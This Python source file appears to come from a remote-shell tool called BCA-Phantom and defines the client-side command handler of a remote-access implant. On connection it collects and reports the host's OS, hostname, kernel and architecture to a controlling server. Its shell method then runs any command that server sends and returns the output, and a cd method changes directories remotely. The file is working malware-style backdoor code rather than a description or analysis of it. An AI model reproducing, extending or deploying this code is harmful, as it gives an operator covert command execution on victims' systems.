#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Phantom

__author__ = "EONRaider @ keybase.io/eonraider"

import json
import os
import platform
import subprocess
from pathlib import Path
from time import localtime, strftime


class ClientCommands:
    def __init__(self, client):
        """Dispatch the commands received from the server to their
        respective methods, depending on their format.

        :param client: Instance of ShellClient through which commands
            will be received.
        """
        self.client = client

    def _send(self, message: [str, bytes, dict], mode: str = "output") -> None:
        """Wrapper for the client's 'post' method."""
        self.client.post({mode: message})

    def open_session(self) -> None:
        """Builds and sends basic information about the client system
        upon opening a connection to the server."""
        session_info = {
            "Client time": strftime("%Y-%m-%d %H:%M:%S", localtime()),
            "OS": platform.system(),
            "Hostname": platform.node(),
            "Kernel": f"{platform.release()} {platform.version()}",
            "Platform": f"{platform.machine()}"
        }
        self._send(json.dumps(session_info), mode="open_session")

    def cd(self, dest_dir: [str, list]) -> None:
        """Handles change of working directory in the shell."""
        try:
            dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
            os.chdir(Path(dest_dir).expanduser())
        except FileNotFoundError as e:
            self._send(f"{e}\n")

    def shell(self, command: str) -> None:
        """Handles all standard shell commands received from the
        server."""
        try:
            cmd = subprocess.run(command, capture_output=True, shell=True)
        except FileNotFoundError as e:
            self._send(f"{e}\n")
        else:
            for result in cmd.stdout, cmd.stderr:
                if len(result) > 0:
                    self._send(result)
